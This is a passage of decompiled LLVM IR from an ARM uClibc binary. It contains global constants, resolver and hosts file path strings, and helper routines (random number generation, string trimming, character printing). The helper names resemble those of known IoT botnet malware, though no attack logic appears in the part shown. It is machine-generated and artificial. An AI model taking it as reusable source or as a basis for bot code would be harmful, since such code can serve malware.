@global_var_19f68.371 = constant i32 252117248
@global_var_19f58.373 = constant i32 331776
@global_var_19f48.375 = constant i32 335616
@global_var_116dc.407 = constant i32 -456978431
@global_var_19fc8.413 = constant [8 x i8] c"Success\00"
@global_var_19fb8.415 = constant [15 x i8] c"Unknown error \00"
@global_var_1ac56.417 = constant i32 65536
@global_var_234ec.418 = global i32* @global_var_1ac56.417
@global_var_29558.421 = global i32 0
@global_var_2955c.424 = global i32 0
@global_var_29738.426 = global i32 0
@global_var_2956c.428 = global i32 0
@global_var_234f4.430 = global i32 0
@global_var_29870.435 = global i32 0
@global_var_29864.438 = global i32 0
@global_var_297bc.440 = global i32 0
@global_var_2974c.442 = global i32 0
@global_var_233f4.445 = global i32 256
@global_var_232f8.446 = global i32* @global_var_233f4.445
@global_var_2983c.450 = global i32 0
@global_var_13bdc.451 = constant i32 -382910416
@global_var_12768.458 = constant i32 -442564520
@global_var_23400.464 = global i32 0
@global_var_f9d8.466 = constant i32 -481230848
@global_var_29764.468 = global i32 0
@global_var_f5c4.470 = constant i32 -509587456
@global_var_23418.472 = global i32 0
@global_var_23430 = external global i32
@global_var_23450.478 = global i32 -1726662223
@global_var_23438.485 = local_unnamed_addr global i32* @global_var_23450.478
@global_var_23434.487 = global i32* @global_var_23450.478
@global_var_1ab24.501 = constant i32 0
@global_var_234cc.510 = global i32 0
@global_var_29768.514 = local_unnamed_addr global i32 0
@global_var_29770.519 = global i32 0
@global_var_23000.523 = global i32 -1
@global_var_29778.526 = global i32 0
@global_var_2977c.528 = local_unnamed_addr global i32 0
@global_var_136a0.529 = constant i32 -390234096
@global_var_1ab4c.531 = constant [10 x i8] c"/dev/null\00"
@global_var_29780.533 = global i32 0
@global_var_1004c.537 = constant i32 -382909968
@global_var_2976c.539 = local_unnamed_addr global i32 0
@global_var_11650.542 = constant [3 x i8] c"V\0D\00"
@global_var_234e4 = external local_unnamed_addr global i32
@global_var_fad8.553 = constant i32 -442564608
@global_var_13968.555 = constant i32 -335544720
@global_var_13aa0.558 = constant i32 -275775369
@global_var_297a8.560 = global i32 0
@global_var_29788.562 = global i32 0
@global_var_1ae58.566 = constant [4 x i8] c"inf\00"
@global_var_1ae6c.569 = constant i32 1076101120
@global_var_1ae5b.574 = constant i32 1179535616
@global_var_1ae68.576 = constant i32 2883630
@global_var_112d8.578 = constant i32 -382908944
@global_var_2978c.586 = global i32 0
@global_var_297a4.591 = local_unnamed_addr global i32 0
@global_var_f618.596 = constant i32 -382910448
@global_var_29874.599 = global i32 0
@global_var_1aeb4.601 = constant i32 46
@global_var_29854.603 = global i32 0
@global_var_15a34.605 = constant i32 -369098656
@global_var_1aeb8.612 = constant [17 x i8] c"/etc/resolv.conf\00"
@global_var_1aecc.614 = constant i32 114
@global_var_1aed0.616 = constant [24 x i8] c"/etc/config/resolv.conf\00"
@global_var_1aee8.619 = constant [11 x i8] c"nameserver\00"
@global_var_1aef4.622 = constant [7 x i8] c"domain\00"
@global_var_1aefc.624 = constant [7 x i8] c"search\00"
@global_var_29878.629 = global i32 0
@global_var_2987c.631 = global i32 0
@global_var_1af18.640 = constant [17 x i8] c"0123456789abcdef\00"
@global_var_1af04.642 = constant i32 0
@global_var_1af2c.645 = constant [3 x i8] c"%x\00"
@global_var_1af30.648 = constant [11 x i8] c"/etc/hosts\00"
@global_var_1af3c.650 = constant [18 x i8] c"/etc/config/hosts\00"
@global_var_17808.653 = constant i32 -504313148
@global_var_177f0.654 = constant i32 -483131392
@global_var_176b0.655 = constant i32 -481294847
@global_var_17868.656 = constant i32 -477821825
@global_var_17968.657 = constant i32 -476034303
@global_var_17c54.658 = constant i32 -516685812
@global_var_17b58.659 = constant i32 -905969576
@global_var_17cd4.660 = constant i32 -478149505
@global_var_17cbc.661 = constant i32 -534773758
@global_var_17c70.662 = constant i32 -534773758
@global_var_17c08.663 = constant i32 -483131392
@global_var_23004.665 = global i32 0
@global_var_23510.6 = external global i8*
@global_var_23547.72 = external global i8*
@global_var_23548.73 = local_unnamed_addr global i8 0
@global_var_23549.74 = local_unnamed_addr global i8 0
@global_var_2354a.75 = local_unnamed_addr global i8 0
@2 = internal constant [3 x i8] c" \01\00"
@global_var_23208.298 = global i8* getelementptr inbounds ([3 x i8], [3 x i8]* @2, i32 0, i32 0)
@global_var_23258.299 = local_unnamed_addr global i8 16
@global_var_136b4.305 = constant i8 0
@global_var_23209.334 = local_unnamed_addr global i8 1
@global_var_23259.335 = local_unnamed_addr global i8 1
@global_var_100cc.517 = constant i16 16432
@3 = internal constant [2 x i8] c"\01\00"
@global_var_234f0.593 = global i8* getelementptr inbounds ([2 x i8], [2 x i8]* @3, i32 0, i32 0)
@global_var_234f1.594 = local_unnamed_addr global i8 0
@global_var_19828.264 = constant [2 x i8] c"r\00"

declare void @__pseudo_branch(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @_init() local_unnamed_addr {
entry:
  %v3_8098 = load i32, i32* @r4, align 4
  %v0_80a0 = call i32 @frame_dummy()
  store i32 %v0_80a0, i32* @r0, align 4
  %v1_80a4 = call i32 @__do_global_ctors_aux(i32 %v0_80a0)
  call void @__pseudo_branch(i32 %v3_8098)
  ret i32 %v1_80a4
}

define i32 @__do_global_dtors_aux() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_80b0 = load i32, i32* @r4, align 4
  store i32 %v3_80b0, i32* %stack_var_-12, align 4
  store i32 ptrtoint (i8** @global_var_23510.6 to i32), i32* %r5.global-to-local, align 4
  %v2_80b8 = load i8, i8* bitcast (i8** @global_var_23510.6 to i8*), align 4
  %v2_80bc = icmp eq i8 %v2_80b8, 0
  br i1 %v2_80bc, label %bb7, label %bb

bb:                                               ; preds = %entry
  %v12_80c0 = load i32, i32* @r0, align 4
  ret i32 %v12_80c0

bb7:                                              ; preds = %entry
  store i32 ptrtoint (i32** @global_var_2301c.9 to i32), i32* %r4.global-to-local, align 4
  %v2_80c8 = load i32, i32* bitcast (i32** @global_var_2301c.9 to i32*), align 4
  store i32 %v2_80c8, i32* %r2.global-to-local, align 4
  %v2_80d0 = icmp eq i32 %v2_80c8, 0
  br i1 %v2_80d0, label %bb8, label %dec_label_pc_80d8

dec_label_pc_80d8:                                ; preds = %bb7, %dec_label_pc_80d8.dec_label_pc_80d8_crit_edge
  %v1_80dc = phi i32 [ %v1_80dc.pre, %dec_label_pc_80d8.dec_label_pc_80d8_crit_edge ], [ ptrtoint (i32** @global_var_2301c.9 to i32), %bb7 ]
  %v0_80d8 = phi i32 [ %v2_80e8, %dec_label_pc_80d8.dec_label_pc_80d8_crit_edge ], [ %v2_80c8, %bb7 ]
  %v1_80d8 = add i32 %v0_80d8, 4
  %v2_80dc = inttoptr i32 %v1_80dc to i32*
  store i32 %v1_80d8, i32* %v2_80dc, align 4
  %v0_80e4 = load i32, i32* %r2.global-to-local, align 4
  call void @__pseudo_branch(i32 %v0_80e4)
  %v2_80e8 = load i32, i32* bitcast (i32** @global_var_2301c.9 to i32*), align 4
  store i32 %v2_80e8, i32* %r2.global-to-local, align 4
  %v2_80f0 = icmp eq i32 %v2_80e8, 0
  br i1 %v2_80f0, label %.loopexit, label %dec_label_pc_80d8.dec_label_pc_80d8_crit_edge

dec_label_pc_80d8.dec_label_pc_80d8_crit_edge:    ; preds = %dec_label_pc_80d8
  %v1_80dc.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_80d8

.loopexit:                                        ; preds = %dec_label_pc_80d8
  %v2_8110.pre = load i32, i32* %r5.global-to-local, align 4
  br label %bb8

bb8:                                              ; preds = %.loopexit, %bb7
  %v2_8110 = phi i32 [ %v2_8110.pre, %.loopexit ], [ ptrtoint (i8** @global_var_23510.6 to i32), %bb7 ]
  %v3_8110 = inttoptr i32 %v2_8110 to i8*
  store i8 1, i8* %v3_8110, align 1
  %v2_8114 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8114, i32* %r4.global-to-local, align 4
  %v11_8114 = load i32, i32* @r0, align 4
  ret i32 %v11_8114

; uselistorder directives
  uselistorder i32 %v2_80e8, { 1, 2, 0 }
  uselistorder i32** @global_var_2301c.9, { 1, 0 }
  uselistorder i8** @global_var_23510.6, { 1, 0 }
  uselistorder label %dec_label_pc_80d8, { 1, 0 }
}

define i32 @call___do_global_dtors_aux() local_unnamed_addr {
entry:
  %v5_812c = load i32, i32* @r0, align 4
  ret i32 %v5_812c
}

define i32 @frame_dummy() local_unnamed_addr {
.thread:
  %v2_8150 = load i32, i32* @global_var_23010.19, align 4
  %v2_8154 = icmp eq i32 %v2_8150, 0
  br i1 %v2_8154, label %bb, label %bb2

bb:                                               ; preds = %.thread
  ret i32 ptrtoint (i32* @global_var_23010.19 to i32)

bb2:                                              ; preds = %.thread
  ret i32 ptrtoint (i32* @global_var_23010.19 to i32)

; uselistorder directives
  uselistorder i32* @global_var_23010.19, { 1, 0 }
}

define i32 @call_frame_dummy() local_unnamed_addr {
entry:
  %v5_818c = load i32, i32* @r0, align 4
  ret i32 %v5_818c
}

; Function Attrs: noreturn
define i32 @_start(i32 %arg1, i32 %arg2) local_unnamed_addr #0 {
entry:
  %stack_var_4 = alloca i32, align 4
  %v4_8198 = ptrtoint i32* %stack_var_4 to i32
  %v8_81b8 = call i32 @__uClibc_main(i32 ptrtoint (i32* @global_var_e550.23 to i32), i32 %arg2, i32* nonnull %stack_var_4, i32 32916, i32 98460, i32 %arg1, i32 %v4_8198)
  %v0_81bc = call i32 @abort()
  ret i32 %v0_81bc
}

define i32 @init_rand(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_81dc = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_81dc, i32* @global_var_2354c.26, align 4
  %v1_81fc = add i32 %v0_81dc, -1640531527
  store i32 %v1_81fc, i32* @global_var_23550.27, align 4
  %v1_8218 = add i32 %v0_81dc, 1013904242
  store i32 %v1_8218, i32* @global_var_23554.28, align 4
  br label %dec_label_pc_8230

dec_label_pc_8230:                                ; preds = %entry, %dec_label_pc_8230
  %storemerge12 = phi i32 [ 3, %entry ], [ %v1_8274, %dec_label_pc_8230 ]
  store i32 %storemerge12, i32* %r0.global-to-local, align 4
  %tmp = mul i32 %storemerge12, 4
  %v5_8240 = add i32 %tmp, add (i32 ptrtoint (i32* @global_var_2354c.26 to i32), i32 -12)
  %v6_8240 = inttoptr i32 %v5_8240 to i32*
  %v7_8240 = load i32, i32* %v6_8240, align 4
  %tmp9 = mul i32 %storemerge12, 4
  %v5_8250 = add i32 %tmp9, add (i32 ptrtoint (i32* @global_var_2354c.26 to i32), i32 -8)
  %v6_8250 = inttoptr i32 %v5_8250 to i32*
  %v7_8250 = load i32, i32* %v6_8250, align 4
  %v2_8254 = xor i32 %storemerge12, -1640531527
  %v2_825c = xor i32 %v2_8254, %v7_8240
  %v2_8264 = xor i32 %v2_825c, %v7_8250
  %v5_826c = mul nuw nsw i32 %storemerge12, 4
  %v6_826c = add i32 %v5_826c, ptrtoint (i32* @global_var_2354c.26 to i32)
  %v7_826c = inttoptr i32 %v6_826c to i32*
  store i32 %v2_8264, i32* %v7_826c, align 4
  %v1_8274 = add nuw nsw i32 %storemerge12, 1
  %v7_828c = icmp slt i32 %v1_8274, 4096
  br i1 %v7_828c, label %dec_label_pc_8230, label %dec_label_pc_8290

dec_label_pc_8290:                                ; preds = %dec_label_pc_8230
  %v9_8294 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v9_8294

; uselistorder directives
  uselistorder i32 %storemerge12, { 5, 3, 2, 0, 1, 4 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_8230, { 1, 0 }
}

define i32 @rand_cmwc() local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_82a0 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_82a0, i32* @ip, align 4
  %v2_82d0 = load i32, i32* @global_var_231a8.31, align 4
  %v1_82d4 = add i32 %v2_82d0, 1
  %v3_82dc = urem i32 %v1_82d4, 4096
  store i32 %v3_82dc, i32* @global_var_231a8.31, align 4
  %v4_82f4 = mul nuw nsw i32 %v3_82dc, 4
  %v5_82f4 = add i32 %v4_82f4, ptrtoint (i32* @global_var_2354c.26 to i32)
  %v6_82f4 = inttoptr i32 %v5_82f4 to i32*
  %v7_82f4 = load i32, i32* %v6_82f4, align 4
  %v2_830c = mul i32 %v7_82f4, 18782
  store i32 %v2_830c, i32* %r1.global-to-local, align 4
  %v2_8324 = load i32, i32* @global_var_231a4.34, align 4
  %v2_832c = add i32 %v2_8324, %v2_830c
  %v3_832c = icmp ult i32 %v2_832c, %v2_8324
  %v4_8330 = zext i1 %v3_832c to i32
  %v2_8360 = add i32 %v4_8330, %v2_832c
  %v3_8374 = icmp ult i32 %v2_8360, %v4_8330
  br i1 %v3_8374, label %dec_label_pc_837c, label %dec_label_pc_839c

dec_label_pc_837c:                                ; preds = %entry
  %v1_8380 = add i32 %v2_8360, 1
  %v1_8390 = select i1 %v3_832c, i32 2, i32 1
  br label %dec_label_pc_839c

dec_label_pc_839c:                                ; preds = %entry, %dec_label_pc_837c
  %storemerge = phi i32 [ %v1_8390, %dec_label_pc_837c ], [ %v4_8330, %entry ]
  %stack_var_-28.0 = phi i32 [ %v1_8380, %dec_label_pc_837c ], [ %v2_8360, %entry ]
  store i32 %storemerge, i32* @global_var_231a4.34, align 4
  store i32 %v3_82dc, i32* %r1.global-to-local, align 4
  %v2_83ac = sub i32 -2, %stack_var_-28.0
  store i32 %v2_83ac, i32* %v6_82f4, align 4
  %v1_83bc = load i32, i32* %r1.global-to-local, align 4
  %v4_83bc = mul i32 %v1_83bc, 4
  %v5_83bc = add i32 %v4_83bc, ptrtoint (i32* @global_var_2354c.26 to i32)
  %v6_83bc = inttoptr i32 %v5_83bc to i32*
  %v7_83bc = load i32, i32* %v6_83bc, align 4
  ret i32 %v7_83bc

; uselistorder directives
  uselistorder i32 %v4_8330, { 0, 2, 1 }
  uselistorder i32 %v2_8324, { 1, 0 }
  uselistorder i32 %v3_82dc, { 2, 1, 0 }
  uselistorder i32* @global_var_2354c.26, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_2354c.26 to i32), { 2, 3, 4, 0, 1 }
  uselistorder label %dec_label_pc_839c, { 1, 0 }
}

define i32 @trim(i8* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-32 = alloca i8*, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_83d8 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_83d8, i32* @ip, align 4
  store i8* %arg1, i8** %stack_var_-32, align 4
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v3_83f8 = call i32 @strlen(i8* %arg1)
  store i32 %v3_83f8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8418

dec_label_pc_8418:                                ; preds = %dec_label_pc_8418, %entry
  %stack_var_-24.0 = phi i32 [ 0, %entry ], [ %v1_8410, %dec_label_pc_8418 ]
  %v3_8420 = load i8*, i8** %stack_var_-32, align 4
  %v4_8420 = ptrtoint i8* %v3_8420 to i32
  %v2_8424 = add i32 %v4_8420, %stack_var_-24.0
  %v1_8428 = inttoptr i32 %v2_8424 to i8*
  %v2_8428 = load i8, i8* %v1_8428, align 1
  %v3_8428 = zext i8 %v2_8428 to i32
  store i32 %v3_8428, i32* %r0.global-to-local, align 4
  %v1_8430 = call i32 @isspace(i32 %v3_8428)
  store i32 %v1_8430, i32* %r0.global-to-local, align 4
  %v2_8438 = icmp eq i32 %v1_8430, 0
  %v1_8410 = add i32 %stack_var_-24.0, 1
  br i1 %v2_8438, label %dec_label_pc_8450.preheader, label %dec_label_pc_8418

dec_label_pc_8450.preheader:                      ; preds = %dec_label_pc_8418
  %v1_8400 = add i32 %v3_83f8, -1
  %v5_845c10 = icmp slt i32 %v1_8400, %stack_var_-24.0
  br i1 %v5_845c10, label %dec_label_pc_84d0.preheader, label %dec_label_pc_8460

dec_label_pc_8444:                                ; preds = %dec_label_pc_8460
  %v1_8448 = add i32 %stack_var_-20.011, -1
  %v5_845c = icmp slt i32 %v1_8448, %stack_var_-24.0
  br i1 %v5_845c, label %dec_label_pc_84d0.preheader, label %dec_label_pc_8460

dec_label_pc_8460:                                ; preds = %dec_label_pc_8450.preheader, %dec_label_pc_8444
  %stack_var_-20.011 = phi i32 [ %v1_8448, %dec_label_pc_8444 ], [ %v1_8400, %dec_label_pc_8450.preheader ]
  %v3_8468 = load i8*, i8** %stack_var_-32, align 4
  %v4_8468 = ptrtoint i8* %v3_8468 to i32
  %v2_846c = add i32 %v4_8468, %stack_var_-20.011
  %v1_8470 = inttoptr i32 %v2_846c to i8*
  %v2_8470 = load i8, i8* %v1_8470, align 1
  %v3_8470 = zext i8 %v2_8470 to i32
  store i32 %v3_8470, i32* %r0.global-to-local, align 4
  %v1_8478 = call i32 @isspace(i32 %v3_8470)
  store i32 %v1_8478, i32* %r0.global-to-local, align 4
  %v2_8480 = icmp eq i32 %v1_8478, 0
  br i1 %v2_8480, label %dec_label_pc_84d0.preheader, label %dec_label_pc_8444

dec_label_pc_84d0.preheader:                      ; preds = %dec_label_pc_8444, %dec_label_pc_8460, %dec_label_pc_8450.preheader
  %stack_var_-20.0.lcssa = phi i32 [ %v1_8400, %dec_label_pc_8450.preheader ], [ %v1_8448, %dec_label_pc_8444 ], [ %stack_var_-20.011, %dec_label_pc_8460 ]
  br label %dec_label_pc_84d0

dec_label_pc_8494:                                ; preds = %dec_label_pc_84d0
  %v2_84b8 = add i32 %v4_84f0, %storemerge1
  %v1_84bc = inttoptr i32 %v2_84b8 to i8*
  %v2_84bc = load i8, i8* %v1_84bc, align 1
  %v3_84c0 = inttoptr i32 %v2_84f4 to i8*
  store i8 %v2_84bc, i8* %v3_84c0, align 1
  %v1_84c8 = add i32 %storemerge1, 1
  br label %dec_label_pc_84d0

dec_label_pc_84d0:                                ; preds = %dec_label_pc_84d0.preheader, %dec_label_pc_8494
  %storemerge1 = phi i32 [ %v1_84c8, %dec_label_pc_8494 ], [ %stack_var_-24.0, %dec_label_pc_84d0.preheader ]
  %v7_84dc = icmp sgt i32 %storemerge1, %stack_var_-20.0.lcssa
  %v2_84e8 = sub i32 %storemerge1, %stack_var_-24.0
  %v3_84f0 = load i8*, i8** %stack_var_-32, align 4
  %v4_84f0 = ptrtoint i8* %v3_84f0 to i32
  %v2_84f4 = add i32 %v4_84f0, %v2_84e8
  br i1 %v7_84dc, label %dec_label_pc_84e0, label %dec_label_pc_8494

dec_label_pc_84e0:                                ; preds = %dec_label_pc_84d0
  %v3_84fc = inttoptr i32 %v2_84f4 to i8*
  store i8 0, i8* %v3_84fc, align 1
  %v9_8504 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v9_8504

; uselistorder directives
  uselistorder i32 %storemerge1, { 2, 3, 0, 1 }
  uselistorder i32 %v1_8400, { 1, 0, 2 }
  uselistorder i32 %stack_var_-24.0, { 1, 0, 2, 3, 5, 4 }
  uselistorder i8** %stack_var_-32, { 3, 2, 1, 0 }
  uselistorder i32* %r0.global-to-local, { 4, 2, 1, 5, 3, 7, 6, 0 }
  uselistorder i32 (i32)* @isspace, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_84d0, { 1, 0 }
  uselistorder label %dec_label_pc_84d0.preheader, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8460, { 1, 0 }
}

define i32 @printchar(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_8508 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_8508, i32* @ip, align 4
  %v0_8518 = load i32, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* %stack_var_-24, align 4
  %v2_8524 = icmp eq i32 %v0_8518, 0
  br i1 %v2_8524, label %dec_label_pc_8558, label %dec_label_pc_852c

dec_label_pc_852c:                                ; preds = %entry
  %v1_8530 = inttoptr i32 %v0_8518 to i32*
  %v2_8530 = load i32, i32* %v1_8530, align 4
  %v1_853c = trunc i32 %arg2 to i8
  %v3_853c = inttoptr i32 %v2_8530 to i8*
  store i8 %v1_853c, i8* %v3_853c, align 1
  %v2_8544 = load i32, i32* %v1_8530, align 4
  %v1_8548 = add i32 %v2_8544, 1
  store i32 %v1_8548, i32* %v1_8530, align 4
  %v9_8570.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_856c

dec_label_pc_8558:                                ; preds = %entry
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 1, i32* @r2, align 4
  %v3_8568 = call i32 @__libc_write(i32 1, i32* nonnull %stack_var_-24)
  store i32 %v3_8568, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_856c

dec_label_pc_856c:                                ; preds = %dec_label_pc_852c, %dec_label_pc_8558
  %v9_8570 = phi i32 [ %v9_8570.pre, %dec_label_pc_852c ], [ %v3_8568, %dec_label_pc_8558 ]
  ret i32 %v9_8570

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 4, 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_856c, { 1, 0 }
}

define i32 @prints(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg2 to i32
  %stack_var_-48 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_8574 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_8574, i32* @ip, align 4
  %v3_8578 = load i32, i32* @fp, align 4
  store i32 0, i32* %stack_var_-48, align 4
  %tmp42 = icmp slt i32 %arg3, 1
  br i1 %tmp42, label %dec_label_pc_8630, label %dec_label_pc_85b0

dec_label_pc_85b0:                                ; preds = %entry
  %v2_85e019 = load i8, i8* %arg2, align 1
  %v2_85e421 = icmp eq i8 %v2_85e019, 0
  br i1 %v2_85e421, label %dec_label_pc_85ec, label %dec_label_pc_85c4

dec_label_pc_85c4:                                ; preds = %dec_label_pc_85b0, %dec_label_pc_85c4
  %v4_85dc23 = phi i32 [ %v1_85d4, %dec_label_pc_85c4 ], [ %tmp, %dec_label_pc_85b0 ]
  %stack_var_-40.022 = phi i32 [ %v1_85c8, %dec_label_pc_85c4 ], [ 0, %dec_label_pc_85b0 ]
  %v1_85c8 = add i32 %stack_var_-40.022, 1
  %v1_85d4 = add i32 %v4_85dc23, 1
  %v5_85d8 = inttoptr i32 %v1_85d4 to i8*
  %v2_85e0 = load i8, i8* %v5_85d8, align 1
  %v2_85e4 = icmp eq i8 %v2_85e0, 0
  br i1 %v2_85e4, label %dec_label_pc_85ec, label %dec_label_pc_85c4

dec_label_pc_85ec:                                ; preds = %dec_label_pc_85c4, %dec_label_pc_85b0
  %stack_var_-40.0.lcssa = phi i32 [ 0, %dec_label_pc_85b0 ], [ %v1_85c8, %dec_label_pc_85c4 ]
  %v5_85f8 = icmp slt i32 %stack_var_-40.0.lcssa, %arg3
  br i1 %v5_85f8, label %dec_label_pc_8608, label %dec_label_pc_8618

dec_label_pc_8608:                                ; preds = %dec_label_pc_85ec
  %v2_8610 = sub i32 %arg3, %stack_var_-40.0.lcssa
  br label %dec_label_pc_8618

dec_label_pc_8618:                                ; preds = %dec_label_pc_85ec, %dec_label_pc_8608
  %storemerge3 = phi i32 [ %v2_8610, %dec_label_pc_8608 ], [ 0, %dec_label_pc_85ec ]
  %v1_861c = and i32 %arg4, 2
  %v2_8620 = icmp eq i32 %v1_861c, 0
  br i1 %v2_8620, label %dec_label_pc_8630, label %dec_label_pc_8628

dec_label_pc_8628:                                ; preds = %dec_label_pc_8618
  br label %dec_label_pc_8630

dec_label_pc_8630:                                ; preds = %dec_label_pc_8618, %entry, %dec_label_pc_8628
  %stack_var_-28.0 = phi i32 [ %arg3, %entry ], [ %storemerge3, %dec_label_pc_8618 ], [ %storemerge3, %dec_label_pc_8628 ]
  %stack_var_-44.0 = phi i32 [ 32, %entry ], [ 32, %dec_label_pc_8618 ], [ 48, %dec_label_pc_8628 ]
  %v1_8634 = urem i32 %arg4, 2
  %v2_8638 = icmp eq i32 %v1_8634, 0
  br i1 %v2_8638, label %dec_label_pc_8668.preheader, label %dec_label_pc_86a4.preheader

dec_label_pc_8668.preheader:                      ; preds = %dec_label_pc_8630
  %v5_867016 = icmp sgt i32 %stack_var_-28.0, 0
  br i1 %v5_867016, label %dec_label_pc_8644.lr.ph, label %dec_label_pc_86a4.preheader

dec_label_pc_8644.lr.ph:                          ; preds = %dec_label_pc_8668.preheader
  %v2_864c = inttoptr i32 %arg1 to i32*
  br label %dec_label_pc_8644

dec_label_pc_8644:                                ; preds = %dec_label_pc_8644.lr.ph, %dec_label_pc_8644
  %stack_var_-28.117 = phi i32 [ %stack_var_-28.0, %dec_label_pc_8644.lr.ph ], [ %v1_8660, %dec_label_pc_8644 ]
  %v3_864c = call i32 @printchar(i32* %v2_864c, i32 %stack_var_-44.0)
  %v3_8650 = load i32, i32* %stack_var_-48, align 4
  %v1_8654 = add i32 %v3_8650, 1
  store i32 %v1_8654, i32* %stack_var_-48, align 4
  %v1_8660 = add nsw i32 %stack_var_-28.117, -1
  %v5_8670 = icmp sgt i32 %stack_var_-28.117, 1
  br i1 %v5_8670, label %dec_label_pc_8644, label %dec_label_pc_86a4.preheader

dec_label_pc_86a4.preheader:                      ; preds = %dec_label_pc_8644, %dec_label_pc_8668.preheader, %dec_label_pc_8630
  %v3_86e827 = phi i32 [ 0, %dec_label_pc_8630 ], [ 0, %dec_label_pc_8668.preheader ], [ %v1_8654, %dec_label_pc_8644 ]
  %stack_var_-28.2.ph = phi i32 [ %stack_var_-28.0, %dec_label_pc_8630 ], [ %stack_var_-28.0, %dec_label_pc_8668.preheader ], [ 0, %dec_label_pc_8644 ]
  %v2_86a89 = load i8, i8* %arg2, align 1
  %v2_86ac11 = icmp eq i8 %v2_86a89, 0
  br i1 %v2_86ac11, label %dec_label_pc_86dc.preheader, label %dec_label_pc_8678.lr.ph

dec_label_pc_8678.lr.ph:                          ; preds = %dec_label_pc_86a4.preheader
  %v2_8688 = inttoptr i32 %arg1 to i32*
  br label %dec_label_pc_8678

dec_label_pc_8678:                                ; preds = %dec_label_pc_8678.lr.ph, %dec_label_pc_8678
  %v4_86a413 = phi i32 [ %tmp, %dec_label_pc_8678.lr.ph ], [ %v1_869c, %dec_label_pc_8678 ]
  %stack_var_-24.012 = phi i8* [ %arg2, %dec_label_pc_8678.lr.ph ], [ %v5_86a0, %dec_label_pc_8678 ]
  %v2_867c = load i8, i8* %stack_var_-24.012, align 1
  %v3_867c = zext i8 %v2_867c to i32
  %v3_8688 = call i32 @printchar(i32* %v2_8688, i32 %v3_867c)
  %v3_868c = load i32, i32* %stack_var_-48, align 4
  %v1_8690 = add i32 %v3_868c, 1
  store i32 %v1_8690, i32* %stack_var_-48, align 4
  %v1_869c = add i32 %v4_86a413, 1
  %v5_86a0 = inttoptr i32 %v1_869c to i8*
  %v2_86a8 = load i8, i8* %v5_86a0, align 1
  %v2_86ac = icmp eq i8 %v2_86a8, 0
  br i1 %v2_86ac, label %dec_label_pc_86dc.preheader, label %dec_label_pc_8678

dec_label_pc_86dc.preheader:                      ; preds = %dec_label_pc_8678, %dec_label_pc_86a4.preheader
  %v3_86e826 = phi i32 [ %v3_86e827, %dec_label_pc_86a4.preheader ], [ %v1_8690, %dec_label_pc_8678 ]
  %v5_86e46 = icmp sgt i32 %stack_var_-28.2.ph, 0
  br i1 %v5_86e46, label %dec_label_pc_86b8.lr.ph, label %dec_label_pc_86e8

dec_label_pc_86b8.lr.ph:                          ; preds = %dec_label_pc_86dc.preheader
  %v2_86c0 = inttoptr i32 %arg1 to i32*
  br label %dec_label_pc_86b8

dec_label_pc_86b8:                                ; preds = %dec_label_pc_86b8.lr.ph, %dec_label_pc_86b8
  %stack_var_-28.37 = phi i32 [ %stack_var_-28.2.ph, %dec_label_pc_86b8.lr.ph ], [ %v1_86d4, %dec_label_pc_86b8 ]
  %v3_86c0 = call i32 @printchar(i32* %v2_86c0, i32 %stack_var_-44.0)
  %v3_86c4 = load i32, i32* %stack_var_-48, align 4
  %v1_86c8 = add i32 %v3_86c4, 1
  store i32 %v1_86c8, i32* %stack_var_-48, align 4
  %v1_86d4 = add nsw i32 %stack_var_-28.37, -1
  %v5_86e4 = icmp sgt i32 %stack_var_-28.37, 1
  br i1 %v5_86e4, label %dec_label_pc_86b8, label %dec_label_pc_86e8

dec_label_pc_86e8:                                ; preds = %dec_label_pc_86b8, %dec_label_pc_86dc.preheader
  %v3_86e8 = phi i32 [ %v3_86e826, %dec_label_pc_86dc.preheader ], [ %v1_86c8, %dec_label_pc_86b8 ]
  store i32 %v3_8578, i32* @fp, align 4
  ret i32 %v3_86e8

; uselistorder directives
  uselistorder i32 %v1_869c, { 1, 0 }
  uselistorder i32 %stack_var_-40.0.lcssa, { 1, 0 }
  uselistorder i32 %v1_85d4, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32 %arg3, { 2, 0, 1, 3 }
  uselistorder i8* %arg2, { 1, 2, 0, 3 }
